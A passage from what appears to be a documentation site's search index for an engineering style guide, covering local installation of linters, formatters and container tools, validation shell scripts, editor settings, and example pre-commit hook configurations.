-L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\"\nsudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl\n\n## Verify\nkubectl version --client\n</code></pre> <p>Install Helm:</p> <pre><code>## macOS\nbrew install helm\n\n## Ubuntu/Debian\ncurl https://baltocdn.com/helm/signing.asc | gpg --dearmor | \\\n  sudo tee /usr/share/keyrings/helm.gpg &gt; /dev/null\necho \"deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/helm.gpg] \\\n  https://baltocdn.com/helm/stable/debian/ all main\" | \\\n  sudo tee /etc/apt/sources.list.d/helm-stable-debian.list\nsudo apt update\nsudo apt install helm\n\n## Verify\nhelm version\n</code></pre> <p>Install kubeval:</p> <pre><code>## macOS\nbrew install kubeval\n\n## Linux\nwget https://github.com/instrumenta/kubeval/releases/latest/download/kubeval-linux-amd64.tar.gz\ntar xf kubeval-linux-amd64.tar.gz\nsudo mv kubeval /usr/local/bin\n</code></pre> <p>Install yamllint:</p> <pre><code>## Using pipx\npipx install yamllint\n\n## Verify\nyamllint --version\n</code></pre> <p>.yamllint:</p> <pre><code>extends: default\n\nrules:\n  line-length:\n    max: 120\n  indentation:\n    spaces: 2\n  comments:\n    min-spaces-from-content: 1\n</code></pre>","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#shell-script-development","title":"Shell Script Development","text":"","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#shellcheck","title":"ShellCheck","text":"<p>Install ShellCheck:</p> <pre><code>## macOS\nbrew install shellcheck\n\n## Ubuntu/Debian\nsudo apt install shellcheck\n\n## Fedora\nsudo dnf install ShellCheck\n\n## Verify\nshellcheck --version\n</code></pre> <p>.shellcheckrc:</p> <pre><code>## Disable specific checks\ndisable=SC1091  # Can't follow sourced files\ndisable=SC2034  # Unused variables\n\n## Set shell dialect\nshell=bash\n</code></pre>","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#shfmt","title":"shfmt","text":"<p>Install shfmt:</p> <pre><code>## macOS\nbrew install shfmt\n\n## Using Go\ngo install mvdan.cc/sh/v3/cmd/shfmt@latest\n\n## Verify\nshfmt --version\n</code></pre> <p>.editorconfig (for shfmt):</p> <pre><code>[*.sh]\nindent_style = space\nindent_size = 2\nend_of_line = lf\ninsert_final_newline = true\ntrim_trailing_whitespace = true\n</code></pre>","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#container-development","title":"Container Development","text":"","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#docker","title":"Docker","text":"<p>Install Docker:</p> <pre><code>## macOS\nbrew install --cask docker\n\n## Ubuntu/Debian\nsudo apt install ca-certificates curl gnupg\nsudo install -m 0755 -d /etc/apt/keyrings\ncurl -fsSL https://download.docker.com/linux/ubuntu/gpg | \\\n  sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg\necho \"deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] \\\n  https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable\" | \\\n  sudo tee /etc/apt/sources.list.d/docker.list\nsudo apt update\nsudo apt install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin\n\n## Verify\ndocker --version\ndocker compose version\n</code></pre>","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#hadolint","title":"Hadolint","text":"<p>Install hadolint:</p> <pre><code>## macOS\nbrew install hadolint\n\n## Linux\nwget -O /usr/local/bin/hadolint https://github.com/hadolint/hadolint/releases/latest/download/hadolint-Linux-x86_64\nchmod +x /usr/local/bin/hadolint\n\n## Verify\nhadolint --version\n</code></pre> <p>.hadolint.yaml:</p> <pre><code>ignored:\n  - DL3008  # Pin versions in apt-get install\n  - DL3009  # Delete apt-get lists after installing\n\ntrustedRegistries:\n  - docker.io\n  - gcr.io\n  - ghcr.io\n\nfailure-threshold: warning\n</code></pre>","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#trivy","title":"Trivy","text":"<p>Install Trivy:</p> <pre><code>## macOS\nbrew install aquasecurity/trivy/trivy\n\n## Ubuntu/Debian\nsudo apt-get install wget apt-transport-https gnupg lsb-release\nwget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | sudo apt-key add -\necho \"deb https://aquasecurity.github.io/trivy-repo/deb $(lsb_release -sc) main\" | sudo tee -a /etc/apt/sources.list.d/trivy.list\nsudo apt-get update\nsudo apt-get install trivy\n\n## Verify\ntrivy --version\n</code></pre>","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#database-development","title":"Database Development","text":"","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#postgresql-tools","title":"PostgreSQL Tools","text":"<p>Install psql client:</p> <pre><code>## macOS\nbrew install postgresql\n\n## Ubuntu/Debian\nsudo apt install postgresql-client\n\n## Verify\npsql --version\n</code></pre>","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#sqlfluff","title":"SQLFluff","text":"<p>Install SQLFluff:</p> <pre><code>## Using pipx\npipx install sqlfluff\n\n## Verify\nsqlfluff --version\n</code></pre> <p>.sqlfluff:</p> <pre><code>[sqlfluff]\ndialect = postgres\ntemplater = jinja\nexclude_rules = L034, L036\nmax_line_length = 120\n\n[sqlfluff:indentation]\nindent_unit = space\ntab_space_size = 2\n\n[sqlfluff:rules]\ncapitalisation_policy = upper\nsingle_table_references = consistent\nunquoted_identifiers_policy = all\n</code></pre>","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#editor-integration","title":"Editor Integration","text":"","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#vs-code","title":"VS Code","text":"<p>Install extensions:</p> <pre><code>## Install VS Code command line\n## macOS: Cmd+Shift+P &gt; \"Shell Command: Install 'code' command in PATH\"\n\n## Install extensions\ncode --install-extension ms-python.python\ncode --install-extension ms-python.black-formatter\ncode --install-extension ms-python.isort\ncode --install-extension ms-python.flake8\ncode --install-extension ms-python.mypy-type-checker\ncode --install-extension dbaeumer.vscode-eslint\ncode --install-extension esbenp.prettier-vscode\ncode --install-extension hashicorp.terraform\ncode --install-extension timonwong.shellcheck\ncode --install-extension foxundermoon.shell-format\ncode --install-extension exiasr.hadolint\ncode --install-extension redhat.ansible\ncode --install-extension ms-azuretools.vscode-docker\n</code></pre> <p>settings.json:</p> <pre><code>{\n  \"editor.formatOnSave\": true,\n  \"editor.codeActionsOnSave\": {\n    \"source.fixAll.eslint\": true,\n    \"source.organizeImports\": true\n  },\n\n  // Python\n  \"python.defaultInterpreterPath\": \"${workspaceFolder}/.venv/bin/python\",\n  \"[python]\": {\n    \"editor.defaultFormatter\": \"ms-python.black-formatter\",\n    \"editor.formatOnSave\": true,\n    \"editor.codeActionsOnSave\": {\n      \"source.organizeImports\": true\n    }\n  },\n  \"black-formatter.args\": [\"--line-length\", \"120\"],\n  \"isort.args\": [\"--profile\", \"black\"],\n  \"flake8.args\": [\"--max-line-length=120\"],\n\n  // TypeScript/JavaScript\n  \"[typescript]\": {\n    \"editor.defaultFormatter\": \"esbenp.prettier-vscode\"\n  },\n  \"[javascript]\": {\n    \"editor.defaultFormatter\": \"esbenp.prettier-vscode\"\n  },\n  \"eslint.validate\": [\"javascript\", \"javascriptreact\", \"typescript\", \"typescriptreact\"],\n\n  // Terraform\n  \"[terraform]\": {\n    \"editor.defaultFormatter\": \"hashicorp.terraform\",\n    \"editor.formatOnSave\": true\n  },\n  \"terraform.languageServer.enable\": true,\n\n  // Shell\n  \"[shellscript]\": {\n    \"editor.defaultFormatter\": \"foxundermoon.shell-format\"\n  },\n  \"shellformat.flag\": \"-i 2 -ci\",\n\n  // YAML\n  \"[yaml]\": {\n    \"editor.defaultFormatter\": \"esbenp.prettier-vscode\"\n  },\n  \"yaml.schemas\": {\n    \"https://json.schemastore.org/github-workflow.json\": \".github/workflows/*.yml\"\n  },\n\n  // Files\n  \"files.insertFinalNewline\": true,\n  \"files.trimTrailingWhitespace\": true,\n  \"files.exclude\": {\n    \"**/__pycache__\": true,\n    \"**/.pytest_cache\": true,\n    \"**/.mypy_cache\": true,\n    \"**/node_modules\": true,\n    \"**/.terraform\": true\n  }\n}\n</code></pre>","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#jetbrains-ides-pycharm-webstorm-intellij","title":"JetBrains IDEs (PyCharm, WebStorm, IntelliJ)","text":"<p>Configure Python tools:</p> <ol> <li>Settings &gt; Tools &gt; Black</li> <li>Enable: \u2713</li> <li>Arguments: <code>--line-length 120</code></li> <li> <p>On code reformat: \u2713</p> </li> <li> <p>Settings &gt; Tools &gt; External Tools</p> </li> <li>Add flake8, mypy, bandit</li> </ol> <p>Configure JavaScript/TypeScript:</p> <ol> <li>Settings &gt; Languages &amp; Frameworks &gt; JavaScript &gt; Prettier</li> <li>Prettier package: <code>./node_modules/prettier</code></li> <li> <p>Run on save: \u2713</p> </li> <li> <p>Settings &gt; Languages &amp; Frameworks &gt; JavaScript &gt; Code Quality Tools &gt; ESLint</p> </li> <li>Automatic ESLint configuration: \u2713</li> <li>Run eslint --fix on save: \u2713</li> </ol>","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#validation-scripts","title":"Validation Scripts","text":"","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#all-in-one-validation-script","title":"All-in-One Validation Script","text":"<p>scripts/validate.sh:</p> <pre><code>#!/bin/bash\nset -euo pipefail\n\nSCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" &amp;&amp; pwd)\"\nPROJECT_ROOT=\"$(cd \"${SCRIPT_DIR}/..\" &amp;&amp; pwd)\"\n\ncd \"${PROJECT_ROOT}\"\n\necho \"=== Running Full Validation ===\"\n\n## Python validation\nif [ -d \"src\" ] &amp;&amp; [ -f \"pyproject.toml\" ]; then\n  echo \"--- Python Validation ---\"\n  black --check src/\n  isort --check-only src/\n  flake8 src/\n  mypy src/\n  bandit -r src/\n  pytest tests/ -v --cov=src --cov-report=term\nfi\n\n## JavaScript/TypeScript validation\nif [ -f \"package.json\" ]; then\n  echo \"--- JavaScript/TypeScript Validation ---\"\n  npm run lint\n  npm run format:check\n  npm run type-check\n  npm test\nfi\n\n## Terraform validation\nif [ -d \"terraform\" ] || [ -f \"*.tf\" ]; then\n  echo \"--- Terraform Validation ---\"\n  terraform fmt -check -recursive\n  terraform validate\n  tflint\nfi\n\n## Shell script validation\nif find . -name \"*.sh\" -not -path \"./node_modules/*\" -not -path \"./.venv/*\" | grep -q .; then\n  echo \"--- Shell Script Validation ---\"\n  find . -name \"*.sh\" -not -path \"./node_modules/*\" -not -path \"./.venv/*\" -exec shellcheck {} +\nfi\n\n## Docker validation\nif [ -f \"Dockerfile\" ]; then\n  echo \"--- Docker Validation ---\"\n  hadolint Dockerfile\nfi\n\necho \"=== All Validations Passed ===\"\n</code></pre> <p>Make executable:</p> <pre><code>chmod +x scripts/validate.sh\n</code></pre>","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#language-specific-scripts","title":"Language-Specific Scripts","text":"<p>scripts/validate-python.sh:</p> <pre><code>#!/bin/bash\nset -euo pipefail\n\necho \"=== Python Validation ===\"\n\n## Activate virtual environment\nsource .venv/bin/activate\n\n## Format check\necho \"Checking formatting...\"\nblack --check src/ tests/\n\n## Import sort check\necho \"Checking import order...\"\nisort --check-only src/ tests/\n\n## Linting\necho \"Running flake8...\"\nflake8 src/ tests/\n\n## Type checking\necho \"Running mypy...\"\nmypy src/\n\n## Security\necho \"Running bandit...\"\nbandit -r src/ -ll\n\n## Tests\necho \"Running tests...\"\npytest tests/ -v --cov=src --cov-report=html --cov-report=term\n\necho \"=== Python Validation Complete ===\"\n</code></pre> <p>scripts/validate-typescript.sh:</p> <pre><code>#!/bin/bash\nset -euo pipefail\n\necho \"=== TypeScript Validation ===\"\n\n## Linting\necho \"Running ESLint...\"\nnpm run lint\n\n## Format check\necho \"Checking formatting...\"\nnpm run format:check\n\n## Type checking\necho \"Running type check...\"\nnpm run type-check\n\n## Build\necho \"Building...\"\nnpm run build\n\n## Tests\necho \"Running tests...\"\nnpm test\n\necho \"=== TypeScript Validation Complete ===\"\n</code></pre>","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#troubleshooting","title":"Troubleshooting","text":"","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#common-issues","title":"Common Issues","text":"<p>Python: \"ModuleNotFoundError\":</p> <pre><code>## Ensure virtual environment is activated\nsource .venv/bin/activate\n\n## Reinstall dependencies\npip install -e .\n## or\nuv pip install -e .\n</code></pre> <p>Node.js: \"command not found\":</p> <pre><code>## Ensure Node.js is in PATH\nnvm use --lts\n\n## Reinstall dependencies\nrm -rf node_modules package-lock.json\nnpm install\n</code></pre> <p>Terraform: \"command not found\":</p> <pre><code>## Verify installation\nwhich terraform\n\n## Reinstall if needed (macOS)\nbrew reinstall terraform\n</code></pre> <p>Pre-commit hooks not running:</p> <pre><code>## Reinstall hooks\npre-commit uninstall\npre-commit install\n\n## Clear cache\npre-commit clean\n\n## Run manually\npre-commit run --all-files\n</code></pre>","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#performance-optimization","title":"Performance Optimization","text":"<p>Python: Use faster tools:</p> <pre><code>## Use uv instead of pip\nuv pip install -r requirements.txt\n\n## Use ruff instead of flake8 (much faster)\npipx install ruff\n</code></pre> <p>Node.js: Use pnpm instead of npm:</p> <pre><code>## Enable pnpm\ncorepack enable\ncorepack prepare pnpm@latest --activate\n\n## Install dependencies\npnpm install\n</code></pre> <p>Parallel execution:</p> <pre><code>## Run pytest in parallel\npytest -n auto\n\n## Run multiple validation commands\nblack src/ &amp; isort src/ &amp; flake8 src/ &amp; wait\n</code></pre>","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#complete-setup-checklist","title":"Complete Setup Checklist","text":"<ul> <li>[ ] Install operating system prerequisites</li> <li>[ ] Configure Git</li> <li>[ ] Install package managers (uv, nvm, rbenv)</li> <li>[ ] Install Python tools (black, isort, flake8, mypy, bandit)</li> <li>[ ] Install Node.js tools (eslint, prettier, typescript)</li> <li>[ ] Install Terraform tools (terraform, terragrunt, tflint, terraform-docs)</li> <li>[ ] Install Ansible tools (ansible, ansible-lint)</li> <li>[ ] Install shell script tools (shellcheck, shfmt)</li> <li>[ ] Install container tools (docker, hadolint, trivy)</li> <li>[ ] Install database tools (psql, sqlfluff)</li> <li>[ ] Configure editor (VS Code or JetBrains)</li> <li>[ ] Install pre-commit hooks</li> <li>[ ] Create validation scripts</li> <li>[ ] Run full validation</li> </ul>","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/local_validation_setup/#resources","title":"Resources","text":"<ul> <li>uv Documentation</li> <li>nvm Documentation</li> <li>Pre-commit Documentation</li> <li>VS Code Python Setup</li> <li>VS Code TypeScript Setup</li> </ul> <p>Next Steps:</p> <ul> <li>Review the Pre-commit Hooks Guide for automated validation</li> <li>Check AI Validation Pipeline for CI/CD integration</li> <li>See GitHub Actions Guide for GitHub CI/CD setup</li> </ul>","tags":["local-development","validation","setup","tooling","linters","formatters","testing"]},{"location":"05_ci_cd/precommit_hooks_guide/","title":"Pre-commit Hooks Guide","text":"","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#introduction","title":"Introduction","text":"<p>Pre-commit hooks are automated checks that run before each Git commit, ensuring code quality, consistency, and security across your entire codebase. This guide covers installation, configuration, and best practices for all languages in the Dukes Engineering Style Guide.</p>","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#table-of-contents","title":"Table of Contents","text":"<ol> <li>Installation and Setup</li> <li>Configuration</li> <li>Language-Specific Hooks</li> <li>Security Hooks</li> <li>Custom Hooks</li> <li>CI/CD Integration</li> <li>Performance Optimization</li> <li>Troubleshooting</li> </ol>","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#installation-and-setup","title":"Installation and Setup","text":"","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#prerequisites","title":"Prerequisites","text":"<p>Install pre-commit via your preferred package manager:</p> <p>Python (pip/pipx):</p> <pre><code>## Using pip\npip install pre-commit\n\n## Using pipx (recommended for global install)\npipx install pre-commit\n</code></pre> <p>Homebrew (macOS/Linux):</p> <pre><code>brew install pre-commit\n</code></pre> <p>System Package Managers:</p> <pre><code>## Ubuntu/Debian\nsudo apt install pre-commit\n\n## Fedora\nsudo dnf install pre-commit\n\n## Arch Linux\nsudo pacman -S pre-commit\n</code></pre>","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#initialize-in-repository","title":"Initialize in Repository","text":"<pre><code>## Navigate to your repository\ncd /path/to/your/repo\n\n## Install pre-commit hooks\npre-commit install\n\n## Install commit-msg hooks (optional, for conventional commits)\npre-commit install --hook-type commit-msg\n\n## Install pre-push hooks (optional, for expensive checks)\npre-commit install --hook-type pre-push\n</code></pre>","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#verify-installation","title":"Verify Installation","text":"<pre><code>## Run hooks on all files to verify setup\npre-commit run --all-files\n\n## Check installed hooks\npre-commit run --hook-stage manual\n</code></pre>","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#configuration","title":"Configuration","text":"","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#basic-pre-commit-configyaml","title":"Basic .pre-commit-config.yaml","text":"<p>Create <code>.pre-commit-config.yaml</code> in your repository root:</p> <pre><code>## Basic pre-commit configuration\nrepos:\n  # General file checks\n  - repo: https://github.com/pre-commit/pre-commit-hooks\n    rev: v4.5.0\n    hooks:\n      - id: trailing-whitespace\n      - id: end-of-file-fixer\n      - id: check-yaml\n      - id: check-json\n      - id: check-added-large-files\n        args: ['--maxkb=1000']\n      - id: check-merge-conflict\n      - id: check-case-conflict\n      - id: mixed-line-ending\n        args: ['--fix=lf']\n      - id: detect-private-key\n\n  # Python\n  - repo: https://github.com/psf/black\n    rev: 23.12.1\n    hooks:\n      - id: black\n        language_version: python3.11\n\n  - repo: https://github.com/PyCQA/flake8\n    rev: 7.0.0\n    hooks:\n      - id: flake8\n        additional_dependencies: [flake8-docstrings]\n\n  # YAML\n  - repo: https://github.com/adrienverge/yamllint\n    rev: v1.33.0\n    hooks:\n      - id: yamllint\n        args: ['-d', '{extends: default, rules: {line-length: {max: 120}}}']\n\n  # Shell scripts\n  - repo: https://github.com/shellcheck-py/shellcheck-py\n    rev: v0.9.0.6\n    hooks:\n      - id: shellcheck\n\n  # Markdown\n  - repo: https://github.com/igorshubovych/markdownlint-cli\n    rev: v0.38.0\n    hooks:\n      - id: markdownlint\n        args: ['--fix']\n\n  # Terraform\n  - repo: https://github.com/antonbabenko/pre-commit-terraform\n    rev: v1.86.0\n    hooks:\n      - id: terraform_fmt\n      - id: terraform_validate\n      - id: terraform_docs\n        args:\n          - '--hook-config=--path-to-file=README.md'\n          - '--hook-config=--add-to-existing-file=true'\n          - '--hook-config=--create-file-if-not-exist=true'\n\n  # Secret detection\n  - repo: https://github.com/Yelp/detect-secrets\n    rev: v1.4.0\n    hooks:\n      - id: detect-secrets\n        args: ['--baseline', '.secrets.baseline']\n</code></pre>","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#full-stack-configuration","title":"Full-Stack Configuration","text":"<p>For projects with multiple languages:</p> <pre><code>## .pre-commit-config.yaml - Full-stack example\nrepos:\n  # ===== General =====\n  - repo: https://github.com/pre-commit/pre-commit-hooks\n    rev: v4.5.0\n    hooks:\n      - id: trailing-whitespace\n        exclude: \\.svg$\n      - id: end-of-file-fixer\n        exclude: \\.svg$\n      - id: check-yaml\n        args: ['--allow-multiple-documents']\n      - id: check-json\n      - id: check-toml\n      - id: check-xml\n      - id: check-added-large-files\n        args: ['--maxkb=2000']\n      - id: check-merge-conflict\n      - id: check-case-conflict\n      - id: mixed-line-ending\n        args: ['--fix=lf']\n      - id: detect-private-key\n      - id: check-symlinks\n      - id: destroyed-symlinks\n      - id: check-executables-have-shebangs\n      - id: check-shebang-scripts-are-executable\n\n  # ===== Python =====\n  - repo: https://github.com/psf/black\n    rev: 23.12.1\n    hooks:\n      - id: black\n        language_version: python3.11\n        args: ['--line-length=120']\n\n  - repo: https://github.com/PyCQA/isort\n    rev: 5.13.2\n    hooks:\n      - id: isort\n        args: ['--profile=black', '--line-length=120']\n\n  - repo: https://github.com/PyCQA/flake8\n    rev: 7.0.0\n    hooks:\n      - id: flake8\n        args: ['--max-line-length=120', '--extend-ignore=E203,W503']\n        additional_dependencies:\n          - flake8-docstrings\n          - flake8-bugbear\n          - flake8-comprehensions\n          - flake8-simplify\n\n  - repo: https://github.com/pre-commit/mirrors-mypy\n    rev: v1.8.0\n    hooks:\n      - id: mypy\n        additional_dependencies: [types-requests, types-PyYAML]\n        args: ['--ignore-missing-imports', '--strict']\n\n  - repo: https://github.com/PyCQA/bandit\n    rev: 1.7.6\n    hooks:\n      - id: bandit\n        args: ['-ll', '-i']\n\n  # ===== JavaScript / TypeScript =====\n  - repo: https://github.com/pre-commit/mirrors-prettier\n    rev: v3.1.0\n    hooks:\n      - id: prettier\n        types_or: [javascript, jsx, ts, tsx, json, yaml, markdown]\n        additional_dependencies:\n          - prettier@3.1.0\n          - '@prettier/plugin-xml@3.2.2'\n\n  - repo: https://github.com/pre-commit/mirrors-eslint\n    rev: v8.56.0\n    hooks:\n      - id: eslint\n        files: \\.[jt]sx?$\n        types: [file]\n        additional_dependencies:\n          - eslint@8.56.0\n          - eslint-config-airbnb-base@15.0.0\n          - eslint-plugin-import@2.29.1\n\n  # ===== YAML =====\n  - repo: https://github.com/adrienverge/yamllint\n    rev: v1.33.0\n    hooks:\n      - id: yamllint\n        args:\n          - '-d'\n          - '{extends: default, rules: {line-length: {max: 120}, indentation: {spaces: 2}}}'\n\n  # ===== Shell Scripts =====\n  - repo: https://github.com/shellcheck-py/shellcheck-py\n    rev: v0.9.0.6\n    hooks:\n      - id: shellcheck\n        args: ['--severity=warning']\n\n  - repo: https://github.com/scop/pre-commit-shfmt\n    rev: v3.7.0-4\n    hooks:\n      - id: shfmt\n        args: ['-i', '2', '-ci', '-w']\n\n  # ===== Markdown =====\n  - repo: https://github.com/igorshubovych/markdownlint-cli\n    rev: v0.38.0\n    hooks:\n      - id: markdownlint\n        args: ['--fix', '--config', '.markdownlint.yaml']\n\n  # ===== Terraform / Terragrunt =====\n  - repo: https://github.com/antonbabenko/pre-commit-terraform\n    rev: v1.86.0\n    hooks:\n      - id: terraform_fmt\n      - id: terraform_validate\n        args:\n          - '--hook-config=--retry-once-with-cleanup=true'\n      - id: terraform_docs\n        args:\n          - '--hook-config=--path-to-file=README.md'\n          - '--hook-config=--add-to-existing-file=true'\n          - '--hook-config=--create-file-if-not-exist=true'\n      - id: terraform_tflint\n        args:\n          - '--args=--config=__GIT_WORKING_DIR__/.tflint.hcl'\n      - id: terraform_trivy\n        args:\n          - '--args=--severity=HIGH,CRITICAL'\n          - '--args=--skip-dirs=\"**/.terraform\"'\n\n  # ===== Ansible =====\n  - repo: https://github.com/ansible/ansible-lint\n    rev: v6.22.2\n    hooks:\n      - id: ansible-lint\n        files: \\.(yaml|yml)$\n        args: ['-c', '.ansible-lint']\n\n  # ===== Dockerfile =====\n  - repo: https://github.com/hadolint/hadolint\n    rev: v2.12.0\n    hooks:\n      - id: hadolint\n        args: ['--ignore', 'DL3008', '--ignore', 'DL3009']\n\n  # ===== Docker Compose =====\n  - repo: https://github.com/IamTheFij/docker-pre-commit\n    rev: v3.0.1\n    hooks:\n      - id: docker-compose-check\n\n  # ===== SQL =====\n  - repo: https://github.com/sqlfluff/sqlfluff\n    rev: 2.3.5\n    hooks:\n      - id: sqlfluff-lint\n        args: ['--dialect', 'postgres']\n      - id: sqlfluff-fix\n        args: ['--dialect', 'postgres']\n\n  # ===== Security Scanning =====\n  - repo: https://github.com/Yelp/detect-secrets\n    rev: v1.4.0\n    hooks:\n      - id: detect-secrets\n        args:\n          - '--baseline'\n          - '.secrets.baseline'\n          - '--exclude-files'\n          - '\\.lock$'\n          - '--exclude-files'\n          - '\\.svg$'\n\n  - repo: https://github.com/trufflesecurity/trufflehog\n    rev: v3.63.7\n    hooks:\n      - id: trufflehog\n        args:\n          - '--no-update'\n          - 'filesystem'\n          - '.'\n          - '--exclude-paths'\n          - '.trufflehog-exclude.txt'\n\n  # ===== Commit Message Validation =====\n  - repo: https://github.com/compilerla/conventional-pre-commit\n    rev: v3.0.0\n    hooks:\n      - id: conventional-pre-commit\n        stages: [commit-msg]\n        args: ['--strict']\n\n  # ===== License Headers =====\n  - repo: https://github.com/Lucas-C/pre-commit-hooks\n    rev: v1.5.4\n    hooks:\n      - id: insert-license\n        files: \\.(py|sh|yaml|yml|tf)$\n        args:\n          - '--license-filepath'\n          - 'LICENSE-HEADER.txt'\n          - '--comment-style'\n          - '#'\n</code></pre>","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#configuration-file-organization","title":"Configuration File Organization","text":"<p>For large projects, split configuration by environment:</p> <p>.pre-commit-config.yaml (main config):</p> <pre><code>## Main pre-commit configuration\ndefault_install_hook_types: [pre-commit, commit-msg, pre-push]\ndefault_stages: [commit]\n\nrepos:\n  # Fast checks run on every commit\n  - repo: https://github.com/pre-commit/pre-commit-hooks\n    rev: v4.5.0\n    hooks:\n      - id: trailing-whitespace\n      - id: end-of-file-fixer\n      - id: check-yaml\n      - id: detect-private-key\n\n  # Language-specific fast checks\n  - repo: https://github.com/psf/black\n    rev: 23.12.1\n    hooks:\n      - id: black\n\n  # Expensive checks run on pre-push\n  - repo: https://github.com/pre-commit/mirrors-mypy\n    rev: v1.8.0\n    hooks:\n      - id: mypy\n        stages: [pre-push]\n\n  - repo: https://github.com/PyCQA/bandit\n    rev: 1.7.6\n    hooks:\n      - id: bandit\n        stages: [pre-push]\n</code></pre>","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#language-specific-hooks","title":"Language-Specific Hooks","text":"","tags":["pre-commit","hooks","code-quality","automation","linting","formatting","security"]},{"location":"05_ci_cd/precommit_hooks_guide/#python","title":"Python","text":"<p>Complete Python Hook Configuration:</p> <pre><code>repos:\n  # Formatting\n  - repo: https://github.com/psf/black\n    rev: 23.12.1\n    hooks:\n      - id: black\n        language_version: python3.11\n        args: ['--line-length=120', '--target-version=py311']\n\n  # Import sorting\n  - repo: https://github.com/PyCQA/isort\n    rev: 5.13.2\n    hooks:\n      - id: isort\n        args:\n          - '--profile=black'\n          - '--line-length=120'\n          - '--skip-gitignore'\n\n  # Linting\n  - repo: https://github.com/PyCQA/flake8\n    rev: 7.0.0\n    hooks:\n      - id: flake8\n        args:\n          - '--max-line-length=120'\n          - '--extend-ignore=E203,W503'\n          - '--max-complexity=10'\n        additional_dependencies:\n          - flake8-docstrings&gt;=1.7.0\n          - flake8-bugbear&gt;=23.12.2\n          - flake8-comprehensions&gt;=3.14.0\n          - flake8-simplify&gt;=0.21.0\n          - flake8-annotations&gt;=3.0.1\n\n  # Type checking\n  - repo: https://github.com/pre-commit/mirrors-mypy\n    rev: v1.8.0\n    hooks:\n      - id: mypy\n        additional_dependencies:\n          - types-requests\n          - types-PyYAML\n          - types-toml\n        args:\n          - '--ignore-missing-imports'\n          - '--strict'\n          - '--no-implicit-optional'\n          - '--warn-redundant-casts'\n\n  # Security\n  - repo: https://github.com/PyCQA/bandit\n    rev: 1.7.6\n    hooks:\n      - id: bandit\n        args:\n          - '-ll'  # Only show medium/high severity\n          - '-i'   # Show confidence level\n          - '-x'   # Exclude test directories\n          - 'tests/'\n\n  # Docstring coverage\n  - repo: https://github.com/econchick/interrogate\n    rev: 1.5.0\n    hooks:\n      - id: interrogate\n        args: ['-vv', '--fail-under=80', '--ignore-init-method']\n\n  # Requirements.txt sorting\n  - repo: https://github.com/pre-commit/mirrors-pip-tools\n    rev: v7.3.0\n    hooks:\n      - id: pip-compile\n        files: ^requirements\\.(in|txt)$\n</code></pre> <p>pyproject.toml configuration:</p> <pre><code>[tool.black]\nline-length = 120\ntarget-version = ['py311']\ninclude = '\\.pyi?$'\nextend-exclude = '''\n/(\n  # directories\n  \\.eggs\n  | \\.git\n  | \\.venv\n  | build\n  | dist\n)/\n'''\n\n[tool.isort]\nprofile = \"black\"\nline_length = 120\nskip_gitignore = true\nknown_first_party = [\"myapp\"]\n\n[tool.mypy]\npython_version = 